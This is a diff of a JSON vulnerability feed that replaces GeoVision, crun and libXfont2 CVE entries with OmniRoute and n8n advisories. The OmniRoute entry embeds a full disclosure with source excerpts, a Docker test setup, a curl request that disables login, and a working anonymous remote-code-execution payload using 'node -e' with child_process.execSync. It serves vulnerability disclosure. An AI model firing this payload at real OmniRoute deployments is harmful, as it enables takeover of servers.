@@ -12,761 +12,964 @@
   },
   "cves": [
     {
-      "id": "CVE-2026-88286",
-      "summary": "GeoVision GV-LPC2211 V1.13 improperly manages PTZ connection state, allowing an unauthenticated remote client to block the accept loop and prevent new PTZ connections.",
-      "cvssScore": 8.1,
-      "severity": "High",
+      "id": "CVE-2026-88062",
+      "summary": "## 2. Summary\n\n`POST /api/acp/agents` registers a custom ACP agent. The endpoint accepts user-controlled\n`binary` and `versionCommand` values. After saving the custom agent, the same request calls\n`refreshAgentCache()`, which triggers agent version detection. The version probe eventually runs:\n\n```ts\nexecFileSync(probe.command, probe.args, ...)\n```\n\nThe only validation is `resolveVersionProbe(binary, versionCommand, true)`, which checks that the\nfirst token of `versionCommand` matches the request-provided `binary`. Because `binary` is also\nattacker-controlled, an attacker can submit:\n\n```json\n{\n  \"binary\": \"node\",\n  \"versionCommand\": \"node -e \\\"...arbitrary JavaScript...\\\"\"\n}\n```\n\nThis executes arbitrary Node.js code inside the server container, and that code can execute OS\ncommands via `child_process.execSync()`.\n\nWhen `requireLogin=false`, `isAuthenticated()` treats anonymous requests as authenticated. At the\nsame time, `/api/acp/` is not included in `LOCAL_ONLY_API_PREFIXES` or `SPAWN_CAPABLE_PREFIXES`, so\nthe endpoint is not blocked by the LOCAL_ONLY policy before reaching the anonymous allow branch.\nAs a result, a remote anonymous attacker can execute commands inside the OmniRoute container with a\nsingle HTTP request.\n\n## 3. Preconditions\n\nThe unauthenticated exploit is reachable in either of the following scenarios:\n\n1. The target instance has `requireLogin=false`. This is the primary scenario covered by this\n   report and by the reproduction steps below.\n2. A fresh instance has no management password configured yet. During this bootstrap window,\n   `/api/settings/require-login` allows unauthenticated setup writes, so an attacker can first set\n   `requireLogin=false` and then call the vulnerable endpoint.\n\nIf the instance is in the default `requireLogin=true` state and already has a management password,\nexploitation requires a valid management session or management-scoped API key. In that case, the\nbug is authenticated RCE rather than the unauthenticated scenario emphasized here.\n\n## 4. Technical Analysis\n\n### 4.1 The Endpoint Accepts User-Controlled Command Fields\n\n`src/app/api/acp/agents/route.ts:15-24` defines a request schema that accepts `binary`,\n`versionCommand`, and `spawnArgs`:\n\n```ts\nconst customAgentBodySchema = z.object({\n  action: z.string().optional(),\n  id: z.string().optional(),\n  name: z.string().optional(),\n  binary: z.string().optional(),\n  versionCommand: z.string().optional(),\n  providerAlias: z.string().optional(),\n  spawnArgs: z.array(z.string()).optional(),\n  protocol: z.enum([\"stdio\", \"http\"]).optional(),\n});\n```\n\nThe `POST` handler at `src/app/api/acp/agents/route.ts:58-61` only calls `isAuthenticated()`:\n\n```ts\nexport async function POST(request: Request) {\n  if (!(await isAuthenticated(request))) {\n    return NextResponse.json({ error: \"Unauthorized\" }, { status: 401 });\n  }\n```\n\nThe handler then stores `binary` and `versionCommand` in the custom agent definition without an\nexecutable allowlist:\n\n```ts\nconst newAgent: CustomAgentDef = {\n  id: id.toLowerCase().replace(/[^a-z0-9-]/g, \"-\"),\n  name,\n  binary,\n  versionCommand,\n  providerAlias: providerAlias || id,\n  spawnArgs: spawnArgs || [],\n  protocol: protocol || \"stdio\",\n};\n```\n\nThis logic is in `src/app/api/acp/agents/route.ts:92-100`.\n\n### 4.2 The Only Guard Is a Self-Consistency Check\n\nThe only command validation in the route is at `src/app/api/acp/agents/route.ts:102-107`:\n\n```ts\nif (!resolveVersionProbe(newAgent.binary, newAgent.versionCommand, true)) {\n  return NextResponse.json(\n    { error: \"Invalid versionCommand: use the configured binary with plain arguments only\" },\n    { status: 400 }\n  );\n}\n```\n\nThe core logic of `resolveVersionProbe()` is in `src/lib/acp/registry.ts:261-288`:\n\n```ts\nexport function resolveVersionProbe(\n  binary: string,\n  versionCommand: string,\n  requireBinaryMatch = false\n): { command: string; args: string[] } | null {\n  const tokens = tokenizeVersionCommand(versionCommand);\n  if (!tokens) {\n    return null;\n  }\n\n  const [command, ...args] = tokens;\n  if (!command) {\n    return null;\n  }\n\n  if (requireBinaryMatch) {\n    const normalizedCommand = normalizeCommandToken(command);\n    const allowed = new Set([\n      normalizeCommandToken(binary),\n      normalizeCommandToken(path.basename(binary)),\n    ]);\n    if (!allowed.has(normalizedCommand)) {\n      return null;\n    }\n  }\n\n  return { command, args };\n}\n```\n\nThis check only requires the first token of `versionCommand` to equal `binary` or\n`path.basename(binary)`. Since `binary` is also attacker-controlled, `binary=\"node\"` and\n`versionCommand=\"node -e \\\"...\\\"\"` pass validation.\n\n`tokenizeVersionCommand()` only blocks a small set of shell metacharacters\n(`src/lib/acp/registry.ts:183-254`):\n\n```ts\nconst DISALLOWED_VERSION_COMMAND_CHARS = /[;&|<>`$\\r\\n]/;\n```\n\nThis does not prevent `node -e` code execution, because characters needed for the payload, such as\n`(`, `)`, `'`, `.`, `/`, `,`, and spaces, are allowed.\n\n### 4.3 The Same Request Immediately Triggers Command Execution\n\nAfter saving the custom agent, the route calls `refreshAgentCache()` at\n`src/app/api/acp/agents/route.ts:121-127`:\n\n```ts\nconst updated = [...current, newAgent];\nawait updateSettings({ customAgents: updated });\nsetCustomAgents(updated);\n\nconst agents = refreshAgentCache();\nreturn NextResponse.json({ agents, added: newAgent });\n```\n\n`refreshAgentCache()` is defined at `src/lib/acp/registry.ts:366-369`:\n\n```ts\nexport function refreshAgentCache(): CliAgentInfo[] {\n  _cachedAgents = null;\n  return detectInstalledAgents();\n}\n```\n\n`detectInstalledAgents()` merges built-in and custom agents and calls `detectAgent()` for each one\n(`src/lib/acp/registry.ts:342-360`):\n\n```ts\nconst allDefs = [\n  ...AGENT_DEFINITIONS.map((d) => ({ ...d, _custom: false })),\n  ..._customAgentDefs.map((d) => ({ ...d, _custom: true })),\n];\n\n_cachedAgents = allDefs.map((def) => {\n  const { _custom, ...rest } = def;\n  return detectAgent(rest, _custom);\n});\n```\n\nThe command execution sink is at `src/lib/acp/registry.ts:307-325`:\n\n```ts\nconst probe = resolveVersionProbe(def.binary, def.versionCommand, isCustom);\nif (!probe) {\n  return { ...def, version, installed, isCustom };\n}\n\nconst output = execFileSync(probe.command, probe.args, {\n  timeout: 5000,\n  encoding: \"utf-8\",\n  stdio: [\"pipe\", \"pipe\", \"pipe\"],\n  ...(shouldUseShellForVersionProbe(probe.command) ? { shell: true } : {}),\n}).trim();\n```\n\nOn Linux containers, `shouldUseShellForVersionProbe()` returns `false` for non-Windows platforms\n(`src/lib/acp/registry.ts:290-301`):\n\n```ts\nexport function shouldUseShellForVersionProbe(\n  command: string,\n  platform = process.platform\n): boolean {\n  if (platform !== \"win32\") return false;\n  ...\n}\n```\n\nTherefore the effective execution is `execFileSync(\"node\", [\"-e\", \"...\"])`. No shell\nmetacharacters are required.\n\n### 4.4 Why This Is Unauthenticated\n\n`isAuthenticated()` is defined at `src/shared/utils/apiAuth.ts:285-302`:\n\n```ts\nexport async function isAuthenticated(request: Request): Promise<boolean> {\n  if (!(await isAuthRequired(request))) {\n    return true;\n  }\n  ...\n}\n```\n\n`isAuthRequired()` returns `false` when `requireLogin=false`\n(`src/shared/utils/apiAuth.ts:317-323`):\n\n```ts\nconst settings = await getSettings();\nif (settings.requireLogin === false) return false;\n```\n\nThe centralized management policy also has the same anonymous allow branch at\n`src/server/authz/policies/management.ts:223-226`:\n\n```ts\nif (!isAlwaysProtectedPath(path) && !(await isAuthRequired(ctx.request))) {\n  return allow({ kind: \"anonymous\", id: \"anonymous\", label: \"auth-disabled\" });\n}\n```\n\nRoutes that can start local subprocesses should be blocked by the LOCAL_ONLY policy first.\n`src/server/authz/routeGuard.ts:29-45` lists LOCAL_ONLY prefixes such as `/api/mcp/`,\n`/api/cli-tools/runtime/`, `/api/services/`, `/api/tools/agent-bridge/`, and `/api/plugins/`, but\nit does not include `/api/acp/`:\n\n```ts\nexport const LOCAL_ONLY_API_PREFIXES: ReadonlyArray<string> = [\n  \"/api/mcp/\",\n  \"/api/cli-tools/runtime/\",\n  \"/api/services/\",\n  \"/dashboard/providers/services/\",\n  \"/api/copilot/\",\n  \"/api/tools/agent-bridge/\",\n  \"/api/tools/traffic-inspector/\",\n  \"/api/plugins/\",\n  \"/api/plugins\",\n  \"/api/system/version\",\n  \"/api/db-backups/exportAll\",\n  \"/api/local/\",\n  \"/api/headroom/start\",\n  \"/api/headroom/stop\",\n  \"/api/oauth/cursor/auto-import\",\n];\n```\n\n`SPAWN_CAPABLE_PREFIXES` also omits `/api/acp/`\n(`src/shared/constants/spawnCapablePrefixes.ts:26-35`).\n\nThis means `/api/acp/agents` reaches the anonymous allow branch when `requireLogin=false` instead\nof being rejected by the LOCAL_ONLY gate.\n\n## 5. Reproduction Environment\n\nThe issue can be reproduced in a local Docker environment:\n\n- OmniRoute image: `diegosouzapw/omniroute:latest`\n- Exposed port: `20128`\n- Container data directory: `/app/data`\n- PoC behavior: runs only read-only commands (`id` and `uname -a`) and writes their output to\n  `/app/data/UNAUTH_RCE_PROOF.txt`\n\n## 6. Reproduction Steps\n\n### 6.1 Start a Test Instance\n\n```bash\nJWT=$(openssl rand -base64 48)\nAKS=$(openssl rand -hex 32)\n\ndocker network create omniroute-poc-net\ndocker run -d --name omniroute-poc-redis --network omniroute-poc-net redis:7-alpine\ndocker run -d --name omniroute-poc --network omniroute-poc-net \\\n  -p 20128:20128 -p 20129:20129 \\\n  -e JWT_SECRET=\"$JWT\" \\\n  -e API_KEY_SECRET=\"$AKS\" \\\n  -e REDIS_URL=\"redis://omniroute-poc-redis:6379\" \\\n  diegosouzapw/omniroute:latest\n```\n\nWait for startup:\n\n```bash\nuntil curl -sf http://localhost:20128/api/health >/dev/null 2>&1 || \\\n      curl -sf http://localhost:20128/ >/dev/null 2>&1; do\n  sleep 2\ndone\n```\n\n### 6.2 Put the Instance in the Login-Disabled State\n\nThis step models a self-hosted instance where dashboard login has been disabled:\n\n```bash\ncurl -s -X POST \"http://localhost:20128/api/settings/require-login\" \\\n  -H \"content-type: application/json\" \\\n  -d '{\"requireLogin\":false}'\n```\n\nIf the target is already in `requireLogin=false`, this step is not needed.\n\n### 6.3 Trigger RCE Anonymously\n\nThe following request sends no cookie and no Bearer token:\n\n```bash\ncurl -s -X POST \"http://localhost:20128/api/acp/agents\" \\\n  -H \"content-type: application/json\" \\\n  -d '{\n    \"id\":\"anonrce\",\n    \"name\":\"anonrce\",\n    \"binary\":\"node\",\n    \"protocol\":\"stdio\",\n    \"versionCommand\":\"node -e \\\"require('\\''fs'\\'').writeFileSync('\\''/app/data/UNAUTH_RCE_PROOF.txt'\\'',require('\\''child_process'\\'').execSync('\\''id'\\'').toString()+require('\\''child_process'\\'').execSync('\\''uname -a'\\'').toString())\\\"\"\n  }'\n```\n\n### 6.4 Verify Command Execution\n\n```bash\ndocker exec omniroute-poc cat /app/data/UNAUTH_RCE_PROOF.txt\n```\n\nExpected output is similar to:\n\n```text\nuid=1000(node) gid=1000(node) groups=1000(node)\nLinux <container-id> <kernel-version> ... <arch> GNU/Linux\n```\n\nThis proves that the anonymous HTTP request executed `id` and `uname -a` inside the OmniRoute\ncontainer.\n\n<img width=\"2123\" height=\"1195\" alt=\"image\" src=\"https://github.com/user-attachments/assets/935ae9c2-3d75-45ec-9a90-f325bbd17e4f\" />",
+      "cvssScore": 9.5,
+      "severity": "Critical",
       "published": "2026-09-10",
       "modified": "2026-09-10",
-      "cwe": null,
+      "cwe": {
+        "cwe_id": "CWE-94",
+        "name": "Improper Control of Generation of Code ('Code Injection')"
+      },
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88286",
-        "https://www.geovision.com.tw/cyber_security.php"
+        "https://github.com/diegosouzapw/OmniRoute/security/advisories/GHSA-hf57-cqmx-p4gr",
+        "https://github.com/diegosouzapw/OmniRoute/pull/11028",
+        "https://github.com/diegosouzapw/OmniRoute/commit/60829241fd64d0317aa6a0dd8cd7a445a5287fed",
+        "https://github.com/advisories/GHSA-hf57-cqmx-p4gr"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "omniroute npm"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-88287",
-      "summary": "GeoVision GV-LPC2211 V1.13 fails to bound the number of Scopes tokens in unauthenticated ONVIF WS-Discovery Probe requests, allowing a remote attacker to corrupt stack control state and crash the discovery process.",
-      "cvssScore": 8.1,
-      "severity": "High",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88287",
-        "https://www.geovision.com.tw/cyber_security.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-88290",
-      "summary": "GeoVision GV-LPC2211 V1.14 (260903) allows unauthenticated clients to declare unbounded VLSVR frame lengths and indefinitely delay blocking receives, allowing remote exhaustion of memory, connection, and worker resources.",
-      "cvssScore": 8.1,
-      "severity": "High",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88290",
-        "https://www.geovision.com.tw/cyber_security.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-88288",
-      "summary": "GeoVision GV-LPC2211 V1.13 fails to restrict the filename supplied to BKDownloadLink.cgi, allowing a remote user with valid web credentials to read arbitrary files accessible to the root-run web service.",
-      "cvssScore": 4.2,
+      "id": "CVE-2026-86073",
+      "summary": "## Impact\n\nThe OAuth token endpoint bound an authorization code's first access token to the consented resource, but not its refresh token. Refreshing only checked that the requested resource was registered, not that it matched the original grant. An OAuth client approved for one workflow could refresh with a different workflow's URL and get a valid, unapproved token for it. The patch binds refresh tokens to the granted resource and rejects mismatches.\n\nExploitation requires the attacker to register an OAuth client, convince an authenticated user to approve that client for one known protected resource, and know the URL of a second protected resource that the consenting user is permitted to execute.\n\n## Patches\n\nThe issue has been fixed in n8n versions 2.38.1 and 2.37.7. Users should upgrade to this version or later to remediate the vulnerability.\n\n## Workarounds\n\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n- Restrict n8n instance access to fully trusted users only.\n- Deactivate MCP Trigger, form, and webhook workflows that are protected by the n8n OAuth server if they are not required.\n- Audit connected OAuth clients and revoke any that are not recognized or no longer needed.\n- Require re-authorization for all existing OAuth clients after upgrading, as previously issued refresh tokens did not store the original resource binding.\n\nThese workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.",
+      "cvssScore": 5.9,
       "severity": "Medium",
       "published": "2026-09-10",
       "modified": "2026-09-10",
-      "cwe": null,
+      "cwe": {
+        "cwe_id": "CWE-863",
+        "name": "Incorrect Authorization"
+      },
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88288",
-        "https://www.geovision.com.tw/cyber_security.php"
+        "https://github.com/n8n-io/n8n/security/advisories/GHSA-cw9w-vv67-hf73",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-86073",
+        "https://github.com/n8n-io/n8n/pull/37122",
+        "https://github.com/n8n-io/n8n/pull/37588",
+        "https://github.com/n8n-io/n8n/commit/18458482861097a26f874f30ad7e8136e268475c"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "n8n npm"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-88285",
-      "summary": "GeoVision GV-LPC2211 V1.13 exposes a network-accessible PTZ control service without authentication, allowing remote clients to retrieve PTZ information and issue PTZ or raw serial commands.",
-      "cvssScore": 8.1,
-      "severity": "High",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88285",
-        "https://www.geovision.com.tw/cyber_security.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-88284",
-      "summary": "GeoVision GV-LPC2211 V1.13 fails to limit repeated User elements in ONVIF SetUser requests, allowing an authenticated administrator to overwrite stack control state and crash the ONVIF worker.",
-      "cvssScore": 5.5,
+      "id": "CVE-2026-86074",
+      "summary": "## Impact\n\nInstance AI credential setup accepted a credential test/verification URL without checking it matched the workflow node's origin. Exfiltration required the user to actively inject an attacker-controlled URL into the setup flow. The patch derives the credential destination from the node's own URL and confines authenticated requests, redirects and probes to that origin.\n\n## Patches\n\nThe issue has been fixed in n8n versions 2.38.2 and 2.37.7. Users should upgrade to one of these versions or later to remediate the vulnerability.\n\n## Workarounds\n\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n- Disable the Instance AI module by removing `instance-ai` from the `N8N_ENABLED_MODULES` environment variable if it is not required.\n- Restrict n8n instance access to fully trusted users only.\n- Rotate any third-party API credentials that were set up using the Instance AI credential-setup flow on affected versions.\n\nThese workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.",
+      "cvssScore": 5.9,
       "severity": "Medium",
       "published": "2026-09-10",
       "modified": "2026-09-10",
-      "cwe": null,
+      "cwe": {
+        "cwe_id": "CWE-918",
+        "name": "Server-Side Request Forgery (SSRF)"
+      },
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88284",
-        "https://www.geovision.com.tw/cyber_security.php"
+        "https://github.com/n8n-io/n8n/security/advisories/GHSA-q5wm-mgqx-fv2f",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-86074",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.37.7",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.38.2",
+        "https://github.com/advisories/GHSA-q5wm-mgqx-fv2f"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "n8n npm"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-88283",
-      "summary": "GeoVision GV-LPC2211 V1.13 fails to limit repeated User elements in ONVIF CreateUsers requests, allowing an authenticated administrator to overwrite stack control state and crash the ONVIF worker.",
-      "cvssScore": 5.5,
+      "id": "CVE-2026-86995",
+      "summary": "## Impact\n\nThe Git node validated the repository that a fetch or pull targeted, but `setUpstream` wrote a `branch.<name>.remote` value into the repository's own configuration without validating it. A subsequent fetch or pull resolved the remote from that configuration rather than from the checked parameter, so an authenticated user with workflow-edit permission could point it at any local repository the n8n process could read and receive its contents. The patch validates the branch remote configuration on the same terms as the repository parameter.\n\n## Patches\n\nThe issue has been fixed in n8n versions 1.123.76, 2.37.7, and 2.38.2. Users should upgrade to one of these versions or later to remediate the vulnerability.\n\n## Workarounds\n\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n- Restrict n8n instance access to fully trusted users only.\n- Disable the Git node by adding `n8n-nodes-base.git` to the `NODES_EXCLUDE` environment variable.\n- Ensure the n8n process runs under a dedicated low-privilege OS user account to limit the scope of any filesystem access.\n\nThese workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.",
+      "cvssScore": 5.3,
       "severity": "Medium",
       "published": "2026-09-10",
       "modified": "2026-09-10",
-      "cwe": null,
+      "cwe": {
+        "cwe_id": "CWE-22",
+        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+      },
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88283",
-        "https://www.geovision.com.tw/cyber_security.php"
+        "https://github.com/n8n-io/n8n/security/advisories/GHSA-qgpw-8g46-w95v",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-86995",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@1.123.76",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.37.7",
+        "https://github.com/n8n-io/n8n/releases/tag/n8n@2.38.2"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "n8n npm"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-88282",
-      "summary": "GeoVision GV-LPC2211 V1.13 allows an administrator-controlled FTP username containing shell metacharacters to be executed as arbitrary root commands during a subsequent FTP-account update.",
-      "cvssScore": 5.5,
-      "severity": "Medium",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88282",
-        "https://www.geovision.com.tw/cyber_security.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-88281",
-      "summary": "GeoVision GV-LPC2211 V1.13 fails to limit repeated Username elements in ONVIF DeleteUsers requests, allowing an authenticated administrator to overflow a stack array and crash the ONVIF worker.",
-      "cvssScore": 5.5,
-      "severity": "Medium",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88281",
-        "https://www.geovision.com.tw/cyber_security.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-88280",
-      "summary": "GeoVision GV-LPC2211 V1.13 copies an oversized ONVIF SetUser password into a fixed stack field, allowing an authenticated administrator to crash the ONVIF worker.",
-      "cvssScore": 5.5,
-      "severity": "Medium",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88280",
-        "https://www.geovision.com.tw/cyber_security.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-88278",
-      "summary": "GeoVision GV-LPC2211 V1.13 fails to enforce WS-Security UsernameToken freshness or nonce reuse protection, allowing a captured PasswordDigest token to be replayed for subsequent ONVIF operations.",
-      "cvssScore": 8.1,
-      "severity": "High",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88278",
-        "https://www.geovision.com.tw/cyber_security.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-88279",
-      "summary": "GeoVision GV-LPC2211 V1.13 copies oversized ONVIF CreateUsers username or password values into fixed stack fields, allowing an authenticated administrator to crash the ONVIF worker.",
-      "cvssScore": 5.5,
-      "severity": "Medium",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88279",
-        "https://www.geovision.com.tw/cyber_security.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-88274",
-      "summary": "GeoVision GV-LPC2211 V1.13 allows an administrator-controlled wireless SSID containing shell syntax to execute arbitrary commands as root.",
-      "cvssScore": 5.5,
-      "severity": "Medium",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88274",
-        "https://www.geovision.com.tw/cyber_security.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-88276",
-      "summary": "GeoVision GV-LPC2211 V1.13 allows administrator-controlled WEP key values containing shell syntax to execute arbitrary commands as root.",
-      "cvssScore": 5.5,
-      "severity": "Medium",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88276",
-        "https://www.geovision.com.tw/cyber_security.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-88273",
-      "summary": "GeoVision GV-LPC2211 V1.13 allows an administrator-controlled PPPoE username to escape a sourced shell configuration assignment and execute arbitrary commands as root.",
-      "cvssScore": 5.5,
-      "severity": "Medium",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88273",
-        "https://www.geovision.com.tw/cyber_security.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-88275",
-      "summary": "GeoVision GV-LPC2211 V1.13 allows an administrator-controlled WPA-PSK containing shell syntax to execute arbitrary commands as root when wireless configuration is applied.",
-      "cvssScore": 5.5,
-      "severity": "Medium",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88275",
-        "https://www.geovision.com.tw/cyber_security.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-88277",
-      "summary": "GeoVision GV-LPC2211 V1.13 allows an authenticated ONVIF user to inject shell commands through ConsumerReference.Address and execute arbitrary commands as root.",
-      "cvssScore": 7.1,
-      "severity": "High",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88277",
-        "https://www.geovision.com.tw/cyber_security.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-88270",
-      "summary": "GeoVision GV-LPC2211 V1.13 allows a Guest user to enter SSVR firmware-upgrade mode and disrupt live services before any firmware image is validated.",
-      "cvssScore": 7.1,
-      "severity": "High",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88270",
-        "https://www.geovision.com.tw/cyber_security.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-88272",
-      "summary": "GeoVision GV-LPC2211 V1.13 allows an administrator-controlled username containing shell metacharacters to be executed as arbitrary root commands when the stored username is later deleted.",
-      "cvssScore": 5.5,
-      "severity": "Medium",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88272",
-        "https://www.geovision.com.tw/cyber_security.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-88269",
-      "summary": "GeoVision GV-LPC2211 V1.13 allows a Guest user to retrieve persistent device configuration containing plaintext administrative and user credentials through SSVR.",
-      "cvssScore": 4.2,
-      "severity": "Medium",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88269",
-        "https://www.geovision.com.tw/cyber_security.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-88271",
-      "summary": "GeoVision GV-LPC2211 V1.13 allows a Guest user to overwrite device configuration and replace the administrator password through SSVR.",
-      "cvssScore": 7.1,
-      "severity": "High",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88271",
-        "https://www.geovision.com.tw/cyber_security.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-88264",
-      "summary": "A flaw was found in crun. When the container configuration does not give /dev a dedicated mount, terminal setup can redirect /dev/console onto an attacker-controlled path, including via the read-only-rootfs bind-mount fallback. Affected versions are crun 1.29.1 and earlier. Default configurations that mount a fresh /dev are not exposed. No fixed release is available yet.",
-      "cvssScore": 5.4,
-      "severity": "Medium",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88264",
-        "https://access.redhat.com/security/cve/CVE-2026-88264",
-        "https://bugzilla.redhat.com/show_bug.cgi?id=2531223",
-        "https://github.com/containers/crun"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-88268",
-      "summary": "GeoVision GV-LPC2211\nV1.13 contains an authenticated stack buffer overflow in SSVR fragment\nreassembly that allows a valid user to crash the SSVR service.",
-      "cvssScore": 7.1,
-      "severity": "High",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-88268",
-        "https://www.geovision.com.tw/cyber_security.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-84042",
-      "summary": "A flaw was found in crun. When crun is built with libkrun and a container is started rootful with passt networking (krun.use_passt), crun can execute attacker-controlled payload from the container image with host root privileges. The issue is a regression in crun 1.29. It affects crun >= 1.29",
-      "cvssScore": 7.4,
-      "severity": "High",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-84042",
-        "https://access.redhat.com/security/cve/CVE-2026-84042",
-        "https://bugzilla.redhat.com/show_bug.cgi?id=2531222",
-        "https://github.com/containers/crun"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-59679",
-      "summary": "fs_read_glyphs() in the libXfont2 font-server client (src/fc/fserve.c) indexes the per-character encoding[] array using num_chars from the FS_QueryXBitmaps16 reply, but that array was allocated with a size derived from num_extents in the separate FS_QueryXExtents16 reply. The two CARD32 fields are never cross-checked.\nA malicious or compromised font server can send a small num_extents (e.g. 1) in the extents reply, then a large num_chars (e.g. 100000) in the bitmaps reply. This causes attacker-controlled out-of-bounds heap read and writes.",
-      "cvssScore": 8.6,
-      "severity": "High",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-59679",
-        "https://bugzilla.suse.com/show_bug.cgi?id=CVE-2026-59679"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-88265",
